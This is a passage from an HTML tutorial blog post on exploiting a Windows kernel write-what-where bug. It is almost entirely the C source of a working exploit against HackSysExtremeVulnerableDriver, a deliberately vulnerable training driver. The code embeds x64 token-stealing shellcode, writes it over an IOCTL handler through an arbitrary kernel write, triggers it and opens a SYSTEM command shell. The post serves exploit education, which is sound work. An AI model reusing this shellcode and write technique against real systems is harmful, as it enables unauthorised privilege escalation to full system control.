+</span></span><span style="display:flex;"><span>  CHAR cRawBytes[<span style="color:#ae81ff">60</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  CHAR shellcode[]<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* ALIGNMENT */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint (58 bytes) */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* KERNEL RECOVERY */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">/* xor rax, rax */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">&#34;</span>;                                <span style="color:#75715e">/* ret */</span>                            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dwShellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((dwShellcodeLength <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Shellcode must be divisible by 8</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pHEVDBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (pHEVDBase <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of HEVD: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHEVDBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ullTarget <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)pHEVDBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x85b14</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Same operation as the Windows 7 exploit just ported to work on 64bit addressing */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwShellcodeLength; i <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sprintf</span>(cRawBytes, <span style="color:#e6db74">&#34;0x%02x%02x%02x%02x%02x%02x%02x%02x&#34;</span>, ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>),
+</span></span><span style="display:flex;"><span>                                                             ((<span style="color:#66d9ef">uint32_t</span>)shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ullRawBytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoull</span>(cRawBytes, NULL, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WriteBytes</span>(hHEVD, ullRawBytes, ullTarget);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(cRawBytes, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#ae81ff">60</span>);
+</span></span><span style="display:flex;"><span>    ullTarget <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Shellcode buffer written!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  TARGET_FUNCTION,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy the shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once sent, we achieve code execution!</p>
+<p><img src="/0x04-Introduction-To-Windows-Kernel-Write-What-Where/exploit.gif" alt="alt text"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
